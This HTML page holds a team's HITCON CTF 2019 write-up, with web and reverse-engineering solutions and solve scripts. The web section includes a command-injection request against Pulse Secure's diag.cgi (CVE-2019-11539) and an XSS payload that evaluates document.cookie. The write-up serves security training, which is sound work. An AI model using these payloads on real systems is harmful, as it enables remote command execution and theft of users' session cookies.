<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <title>HITCON CTF 2019 Writeup | r3kapig</title>
    <meta property="og:title" content="r3kapig writeup" />
    <meta property="og:locale" content="en_US" />
    <meta name="description" content="Writeup for HITCON CTF 2019 Writeup" />
    <meta property="og:description" content="Writeup for HITCON CTF 2019 Writeup" />
    <link rel="canonical" href="https://r3kapig.com/writeup/" />
    <meta property="og:url" content="https://r3kapig.com/writeup/" />
    <meta property="og:site_name" content="r3kapig" />
    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
  </head>
  <style>
  body {
      padding-top: 56px;
  }

  .sticky-offset {
      top: 56px;
  }

  #body-row {
      margin-left:0;
      margin-right:0;
  }
  #sidebar-container {
      min-height: 100vh;   
      background-color: #333;
      padding: 0;
  }

  /* Sidebar sizes when expanded and expanded */
  .sidebar-expanded {
      width: 230px;
  }
  .sidebar-collapsed {
      width: 60px;
  }

  /* Menu item*/
  #sidebar-container .list-group a {
      height: 50px;
      color: white;
  }

  /* Submenu item*/
  #sidebar-container .list-group .sidebar-submenu a {
      height: 45px;
      padding-left: 60px;
  }
  .sidebar-submenu {
      font-size: 0.9rem;
  }

  /* Separators */
  .sidebar-separator-title {
      background-color: #333;
      height: 35px;
  }
  .sidebar-separator {
      background-color: #333;
      height: 25px;
  }
  .logo-separator {
      background-color: #333;    
      height: 60px;
  }


  /* 
   active scrollspy
  */
  .list-group-item.active {
    border-color: transparent;
    border-left: #e69138 solid 4px;
  }

  /* 
   anchor padding top
   https://stackoverflow.com/a/28824157
  */
  :target:before {
    content:"";
    display:block;
    height:56px; /* fixed header height*/
    margin:-56px 0 0; /* negative fixed header height */
  }
  </style>
  
  <script>
  // https://stackoverflow.com/a/48330533
  $(window).on('activate.bs.scrollspy', function (event) {
    let active_collapse = $($('.list-group-item.active').parents()[0]);
    $(".collapse").removeClass("show");
    active_collapse.addClass("show");

    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
    $('a[href^="#submenu"]').css("border-left", "");
    parent_menu.css("border-left","#e69138 solid 4px");
  });

  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$','$'], ['\\(','\\)']],
      processEscapes: true
    }
  });
  </script>

  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <a class="navbar-brand" href="../">
        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
        <span class="menu-collapsed">r3kapig / writeup</span>
      </a>
      <div class="collapse navbar-collapse" id="navbarNavDropdown">
        <ul class="navbar-nav my-2 my-lg-0">
            
            <li class="nav-item dropdown d-sm-block d-md-none">
              <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
              <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
        
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                web
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#virtual-public-network-[183pts]">virtual-public-network-[183pts]</a>
    
                <a class="dropdown-item" href="#luatic-[230pts]">luatic-[230pts]</a>
    
                <a class="dropdown-item" href="#bounty-pl33z-[255pts]">bounty-pl33z-[255pts]</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                reverse
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#emojivm-[187pts]">emojivm-[187pts]</a>
    
                <a class="dropdown-item" href="#core-dumb-[242pts]">core-dumb-[242pts]</a>
    
                <a class="dropdown-item" href="#ev3-arm-[221pts]">ev3-arm-[221pts]</a>
    
                <a class="dropdown-item" href="#suicune-[305pts]">suicune-[305pts]</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                pwn
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#emojiiivm-[236pts]">emojiiivm-[236pts]</a>
    
                <a class="dropdown-item" href="#crypto-in-the-shell-[284pts]">crypto-in-the-shell-[284pts]</a>
    
                <a class="dropdown-item" href="#lazyhouse-[300pts]">lazyhouse-[300pts]</a>
    
                <a class="dropdown-item" href="#poe-i---luna-[284pts]">poe-i---luna-[284pts]</a>
    
                <a class="dropdown-item" href="#dadadb-[371pts]">dadadb-[371pts]</a>
    
                <a class="dropdown-item" href="#one-punch-man-[292pts]">one-punch-man-[292pts]</a>
    
                <a class="dropdown-item" href="#ðŸŽƒ-trick-or-treat-ðŸŽƒ-[234pts]">ðŸŽƒ-trick-or-treat-ðŸŽƒ-[234pts]</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                misc
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#welcome-[50pts]">welcome-[50pts]</a>
    
                <a class="dropdown-item" href="#revenge-of-welcome-[105pts]">revenge-of-welcome-[105pts]</a>
    
                <a class="dropdown-item" href="#emojiivm-[198pts]">emojiivm-[198pts]</a>
    
                <a class="dropdown-item" href="#hexdump-[202pts]">hexdump-[202pts]</a>
    
                <a class="dropdown-item" href="#ev3-player">ev3-player</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                crypto
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#lost-modulus-again-[200pts]">lost-modulus-again-[200pts]</a>
    
                <a class="dropdown-item" href="#very-simple-haskell-[200pts]">very-simple-haskell-[200pts]</a>
    
              </div>
            </li>
    
        </ul>
      </div>
      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
        <ul class="navbar-nav ml-auto">
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
        </ul>
      </div>
    </nav>
    <div class="row" id="body-row">
      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
        <ul class="list-group sticky-top sticky-offset">
          
          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">web</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu0" class="collapse sidebar-submenu">
            <a href="#virtual-public-network-[183pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">virtual-public-network-[183pts]</span>
            </a>
    
<a href="#luatic-[230pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">luatic-[230pts]</span>
            </a>
    
<a href="#bounty-pl33z-[255pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">bounty-pl33z-[255pts]</span>
            </a>
    
          </div>
    
          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">reverse</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu1" class="collapse sidebar-submenu">
            <a href="#emojivm-[187pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">emojivm-[187pts]</span>
            </a>
    
<a href="#core-dumb-[242pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">core-dumb-[242pts]</span>
            </a>
    
<a href="#ev3-arm-[221pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">ev3-arm-[221pts]</span>
            </a>
    
<a href="#suicune-[305pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">suicune-[305pts]</span>
            </a>
    
          </div>
    
          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">pwn</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu2" class="collapse sidebar-submenu">
            <a href="#emojiiivm-[236pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">emojiiivm-[236pts]</span>
            </a>
    
<a href="#crypto-in-the-shell-[284pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">crypto-in-the-shell-[284pts]</span>
            </a>
    
<a href="#lazyhouse-[300pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">lazyhouse-[300pts]</span>
            </a>
    
<a href="#poe-i---luna-[284pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">poe-i---luna-[284pts]</span>
            </a>
    
<a href="#dadadb-[371pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">dadadb-[371pts]</span>
            </a>
    
<a href="#one-punch-man-[292pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">one-punch-man-[292pts]</span>
            </a>
    
<a href="#ðŸŽƒ-trick-or-treat-ðŸŽƒ-[234pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">ðŸŽƒ-trick-or-treat-ðŸŽƒ-[234pts]</span>
            </a>
    
          </div>
    
          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">misc</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu3" class="collapse sidebar-submenu">
            <a href="#welcome-[50pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">welcome-[50pts]</span>
            </a>
    
<a href="#revenge-of-welcome-[105pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">revenge-of-welcome-[105pts]</span>
            </a>
    
<a href="#emojiivm-[198pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">emojiivm-[198pts]</span>
            </a>
    
<a href="#hexdump-[202pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">hexdump-[202pts]</span>
            </a>
    
<a href="#ev3-player" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">ev3-player</span>
            </a>
    
          </div>
    
          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">crypto</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu4" class="collapse sidebar-submenu">
            <a href="#lost-modulus-again-[200pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">lost-modulus-again-[200pts]</span>
            </a>
    
<a href="#very-simple-haskell-[200pts]" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">very-simple-haskell-[200pts]</span>
            </a>
    
          </div>
    
        </ul>
      </div>
      <div class="col-10 py-3">
        <article class="markdown-body"><h1 id="hitcon-ctf-2019-writeup"><a class="header-link" href="#hitcon-ctf-2019-writeup"></a>HITCON CTF 2019 Writeup</h1>
<h2 id="web"><a class="header-link" href="#web"></a>web</h2>
<h3 id="virtual-public-network-[183pts]"><a class="header-link" href="#virtual-public-network-[183pts]"></a>Virtual Public Network [183pts]</h3>
<blockquote>
<p><a href="http://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html">http://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html</a></p>
</blockquote>
<p>CVE-2019-11539</p>
<p class="img-container"><img src="https://i.loli.net/2019/10/15/U8YQ5DCkc6ZErhv.png" alt=""></p>
<p>Use <code>\x2a</code> instead of <code>$</code></p>
<pre class="hljs"><code>GET /cgi-bin/diag.cgi?options=-r$x%<span class="hljs-number">3</span>d<span class="hljs-string">"bash+-c+<span class="hljs-subst">\"</span>/\x2aREAD_FLAG\x2a<span class="hljs-subst">\"</span>"</span>,system$x%<span class="hljs-number">23</span>+<span class="hljs-number">2</span>&gt;./tmp/cmn.thtml+&lt;&amp;tpl=cmn HTTP/<span class="hljs-number">1.1</span></code></pre><h3 id="luatic-[230pts]"><a class="header-link" href="#luatic-[230pts]"></a>Luatic [230pts]</h3>
<p class="img-container"><img src="https://i.loli.net/2019/10/15/Lvr7WmRI3gnPYEs.png" alt=""></p>
<p>Use <code>_GET</code> to override <code>_POST</code> and then use <code>_POST</code> to override global variables to bypass filter:</p>
<p class="img-container"><img src="https://i.loli.net/2019/10/15/PdLlKoFpGetgYj4.png" alt=""></p>
<p>Overwrite math.random with the redis <code>EVAL</code> command:</p>
<p class="img-container"><img src="https://i.loli.net/2019/10/15/5TUAv7tdmCfRVnu.png" alt=""></p>
<h3 id="bounty-pl33z-[255pts]"><a class="header-link" href="#bounty-pl33z-[255pts]"></a>Bounty Pl33z [255pts]</h3>
<p>After searching, we found that <code>--&gt;</code> can be used as a <code>SingleLineComment</code>:</p>
<blockquote>
<p><a href="https://stackoverflow.com/a/18638833">https://stackoverflow.com/a/18638833</a></p>
</blockquote>
<p>But <code>\n</code> and <code>\r</code> are filtered.</p>
<p>After reading ECMA-262, we found other line terminators:</p>
<blockquote>
<p><a href="http://www.ecma-international.org/ecma-262/6.0/#sec-line-terminators">http://www.ecma-international.org/ecma-262/6.0/#sec-line-terminators</a></p>
</blockquote>
<p class="img-container"><img src="https://i.loli.net/2019/10/15/btWyJmw3Q7o4XMO.png" alt=""></p>
<p>So the final payload:</p>
<pre class="hljs"><code>http:<span class="hljs-regexp">//</span><span class="hljs-number">3.114</span>.<span class="hljs-number">5.202</span>/fd.php?<span class="hljs-keyword">q</span>=pupilesã€‚qwerã€‚design/?<span class="hljs-string">"%2beval(atob(`ZG9jdW1lbnQuY29va2ll`))%E2%80%A8--&gt;</span></code></pre><h2 id="reverse"><a class="header-link" href="#reverse"></a>reverse</h2>
<h3 id="emojivm-[187pts]"><a class="header-link" href="#emojivm-[187pts]"></a>EmojiVM [187pts]</h3>
<p>A challenge of vm_re.The Data Struct is a tree like this.</p>
<pre class="hljs"><code>struct <span class="hljs-keyword">node</span><span class="hljs-title">{
   qword</span> inuse;
   <span class="hljs-keyword">node</span><span class="hljs-title">* parent</span>;
   <span class="hljs-keyword">node</span><span class="hljs-title">* left</span>;
   <span class="hljs-keyword">node</span><span class="hljs-title">* right</span>;
   int value;
   int idx;
}
// left-&gt;value <span class="hljs-tag">&lt; parent-&gt;</span>value <span class="hljs-tag">&lt; right-&gt;</span>value</code></pre><p>we can use emoji(4byte) to specify the appropriate operationï¼ˆ node-&gt;idx corresponding to emoji_value) or use emoji to get a num in stack(0~10 , also by node-&gt;idx). If you want to get a num which more than 10, you can pushu some num(0~9) in stack and use add/multi/sub. The correspondence between the opcode and the operand is in sub_4221 and sub_4db8.
By debug the program ,we can get the conditon are:</p>
<ol class="list">
<li>Input string length is 0x18</li>
<li>Input form: XXXX-XXXX-XXXX-XXXX-XXXX</li>
<li>The conversion rules of each group(4 byte) are as follows:
 First byte: x= x+30
 Second byte: x=(x-8)xor 7
 Third byte: x=((x+44)xor68)-4
 The fourth byte: x=x^0x61</li>
</ol>
<pre class="hljs"><code>import os
m = [<span class="hljs-number">0x8e</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0xcd</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x4b</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0xd9</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0xd1</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x84</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x06</span>]

byte = <span class="hljs-number">0</span>
<span class="hljs-built_in">ans</span> = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> in range(<span class="hljs-number">0x18</span>):
   <span class="hljs-keyword">if</span> (<span class="hljs-built_in">i</span><span class="hljs-comment">%4)==0:</span>
       byte = m[i]<span class="hljs-number">-30</span>
   elif (<span class="hljs-built_in">i</span><span class="hljs-comment">%4==1):</span>
       byte = (m[i] ^ <span class="hljs-number">7</span>) + <span class="hljs-number">8</span>
   elif (<span class="hljs-built_in">i</span><span class="hljs-comment">%4==2):</span>
       byte = ((m[i] + <span class="hljs-number">4</span>) ^ <span class="hljs-number">68</span>) - <span class="hljs-number">44</span>
   <span class="hljs-keyword">else</span>:
       byte = m[i] ^ <span class="hljs-number">0x61</span>
   <span class="hljs-built_in">ans</span> += chr(byte&amp;<span class="hljs-number">0xff</span>)
print <span class="hljs-built_in">ans</span>
</code></pre><h3 id="core-dumb-[242pts]"><a class="header-link" href="#core-dumb-[242pts]"></a>Core Dumb [242pts]</h3>
<p>There are five encrypted shellcodes in the file, decrypt these shellcodes with <code>shellcode[i] ^= key[i%4]</code>. At the beginning of main function, proc init five key and encrypt shellcode,use idapython decrypt shellcode and we can found five function.These functions constrain the flag,<code>flag[0:10]</code>:<code>flag[i] ^= (key[i%4] - 7)</code>,<code>flag[10:18]</code> is similar to TEA,<code>flag[18:36]</code> is base64,<code>flag[36:48]</code> is similar to rc4,<code>flag[48:52]</code> is a hash function, reverse the first four function and exhaustive search the last four bytes to get the flag.</p>
<h3 id="ev3-arm-[221pts]"><a class="header-link" href="#ev3-arm-[221pts]"></a>EV3 Arm [221pts]</h3>
<p>The lsm assembly can be retrieved by <a href="https://github.com/ev3dev/lms-hacker-tools/tree/master/EV3">lms-hacker-tools</a>.
Dump all calls in which certain parameters represent motor, power, and angle.
Watch the video given in the problem description, and then we can know how these combinations of parameters work.
Simulate the car by hand to get the flag.</p>
<h3 id="suicune-[305pts]"><a class="header-link" href="#suicune-[305pts]"></a>Suicune [305pts]</h3>
<p>A challenge similar with Counting in googlectf. The encryption are implemented with low performance. 
We analyse the binary and get the implmenation of the key generator in details. It contains a very ineffient sorting algorithm.
We remaster the algorithm in high performance and make sure it sharing incomplete post-sorted result with the original one. 
Then we enumerate all the possible key to decrypt the given cipher.</p>
<pre class="hljs"><code><span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">except</span> ImportError <span class="hljs-keyword">as</span> e:
    sys.stderr.write(<span class="hljs-string">'You need to install numpy.\n'</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pcg32</span><span class="hljs-params">(param1:np.uint64=None, param2:np.uint64=None)</span> -&gt; np.uint32:</span>
    <span class="hljs-string">"""
    All we ever do is call this over and over, so let's make it
    a generator instead of a class.

    param1 -- initial state of the engine.
    param2 -- the increment.

    yields -- an int, of which 32 bits are suitable scrambled.
    """</span>

    np.seterr(all=<span class="hljs-string">'ignore'</span>) <span class="hljs-comment"># remove overflow messages.</span>

    <span class="hljs-keyword">if</span> param1 <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>: param1 = random.random() * <span class="hljs-number">9223372036854775807</span>
    <span class="hljs-keyword">if</span> param2 <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>: param2 = random.random() * <span class="hljs-number">9223372036854775807</span>

    engine = np.array([param1, param2], dtype=<span class="hljs-string">'uint64'</span>)
    multiplier = np.uint64(<span class="hljs-number">6364136223846793005</span>)
    big_1 = np.uint32(<span class="hljs-number">1</span>)
    big_18 = np.uint32(<span class="hljs-number">18</span>)
    big_27 = np.uint32(<span class="hljs-number">27</span>)
    big_59 = np.uint32(<span class="hljs-number">59</span>)
    big_31 = np.uint32(<span class="hljs-number">31</span>)

    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        old_state = engine[<span class="hljs-number">0</span>]
        inc = engine[<span class="hljs-number">1</span>]
        engine[<span class="hljs-number">0</span>] = old_state * multiplier + (inc | big_1)
        xorshifted = np.uint32(((old_state &gt;&gt; big_18) ^ old_state) &gt;&gt; big_27)
        rot = np.uint32(old_state &gt;&gt; big_59)
        <span class="hljs-keyword">yield</span> np.uint32((xorshifted &gt;&gt; rot) | (xorshifted &lt;&lt; ((-rot) &amp; big_31)))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse</span><span class="hljs-params">(box, left)</span>:</span>
    right = len(box)<span class="hljs-number">-1</span>
    <span class="hljs-keyword">while</span>(left&lt;right):
        box[left], box[right] = box[right], box[left]
        left += <span class="hljs-number">1</span>
        right -= <span class="hljs-number">1</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find</span><span class="hljs-params">(box, left)</span>:</span>
    <span class="hljs-keyword">if</span> left&lt;<span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    r = len(box) - <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(r!=left):
        <span class="hljs-comment"># print(left, r)</span>
        <span class="hljs-keyword">if</span> box[left]&lt;box[r]:
            box[left], box[r] = box[r], box[left]
            <span class="hljs-comment"># fuck</span>
            reverse(box, left+<span class="hljs-number">1</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
        r -= <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">yysort</span><span class="hljs-params">(box, times)</span>:</span>
    l = len(box)

    n = <span class="hljs-number">100</span>
    f = [<span class="hljs-number">0</span>] * n
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,n):
        f[i] = (f[i<span class="hljs-number">-1</span>]+<span class="hljs-number">1</span>)*i<span class="hljs-number">-1</span>

    <span class="hljs-keyword">while</span> times != <span class="hljs-number">0</span>:
        left = l<span class="hljs-number">-1</span>
        <span class="hljs-keyword">while</span> left!=<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> box[left<span class="hljs-number">-1</span>] &gt; box[left]:
            left -= <span class="hljs-number">1</span>
        <span class="hljs-keyword">if</span> left == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">break</span>
        find(box, left<span class="hljs-number">-1</span>)
        times -= <span class="hljs-number">1</span>
        <span class="hljs-keyword">if</span> times == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">break</span>
        m = l-left
        <span class="hljs-keyword">while</span> f[m] &gt; times:
            m -= <span class="hljs-number">1</span>
        reverse(box, l-m)
        times -= f[m]

    <span class="hljs-keyword">return</span> box

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">unknown_generator</span><span class="hljs-params">(times)</span>:</span>
    <span class="hljs-keyword">global</span> x
    box = list(range(<span class="hljs-number">0x100</span>))
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(times):
        xx = next(x) % (<span class="hljs-number">0x100</span>-i)
        y = <span class="hljs-number">0xff</span>-i
        box[xx], box[y] = box[y], box[xx]
    <span class="hljs-keyword">return</span> box

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shuffle_pcg_result</span><span class="hljs-params">(pcg_res, length)</span>:</span>
    res_list = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(pcg_res), length):
        res_list.append(pcg_res[i: i + length])
    <span class="hljs-keyword">return</span> res_list

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">byte_xorer</span><span class="hljs-params">(ba, bb)</span>:</span>
    res = <span class="hljs-string">b''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(ba)):
        t = ba[i] ^ bb[i]
        res += bytes([t])
    <span class="hljs-keyword">return</span> res

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(keys, buf)</span>:</span>
    rkeys = keys[::<span class="hljs-number">-1</span>]
    cur_cipher = buf
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):
        cur_cipher = cur_cipher[::<span class="hljs-number">-1</span>]
        cur_cipher = byte_xorer(cur_cipher, rkeys[i])
    <span class="hljs-keyword">return</span> cur_cipher

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(keys, buf)</span>:</span>
    cur_cipher = buf
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):
        key = keys[i]
        print(key)
        cur_cipher = byte_xorer(cur_cipher, key)
        cur_cipher = cur_cipher[::<span class="hljs-number">-1</span>]
    <span class="hljs-keyword">return</span> cur_cipher

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">keygen</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">global</span> x
    keys = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):
        pcg_res = unknown_generator(<span class="hljs-number">255</span>)[<span class="hljs-number">0</span>: flag_length]
        key_list = pcg_res
        <span class="hljs-comment"># key_list = sort(reverse = True)</span>
        <span class="hljs-string">'''
        The binary uses custom sort algorithm, it won't sort the list completely. 
        However, the binary uses the incompletely sorted list as key. 
        We cannot replay the algorithm in binary for its poor perfomance
        '''</span>
        timesr = (next(x) + <span class="hljs-number">0x100000000</span>) % <span class="hljs-number">0x100000000</span>
        timesl = (next(x) + <span class="hljs-number">0x100000000</span>) % <span class="hljs-number">0x100000000</span>
        times = (timesl &lt;&lt; <span class="hljs-number">32</span>) | timesr
        times = (times + <span class="hljs-number">0x10000000000000000</span>) % <span class="hljs-number">0x10000000000000000</span>
        key_list = yysort(key_list, times)
        keys.append(key_list)

    <span class="hljs-keyword">return</span> keys

flag_key = <span class="hljs-number">45193</span>
output_file_content = <span class="hljs-string">'04dd5a70faea88b76e4733d0fa346b086e2c0efd7d2815e3b6ca118ab945719970642b2929b18a71b28d87855796e344d8'</span>

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:
    flag_length = int(len(output_file_content)/<span class="hljs-number">2</span>)

    buf = bytes.fromhex(output_file_content)

    state = flag_key*<span class="hljs-number">6364136223846793005</span>+<span class="hljs-number">6364136223846793005</span>+<span class="hljs-number">1</span>
    state &amp;= <span class="hljs-number">0xffffffffffffffff</span>
    x=pcg32(state,<span class="hljs-number">1</span>)

    keys = keygen()
    res = decrypt(keys, buf)
    <span class="hljs-keyword">print</span> (res)</code></pre><h2 id="pwn"><a class="header-link" href="#pwn"></a>pwn</h2>
<h3 id="emojiiivm-[236pts]"><a class="header-link" href="#emojiiivm-[236pts]"></a>EmojiiiVM [236pts]</h3>
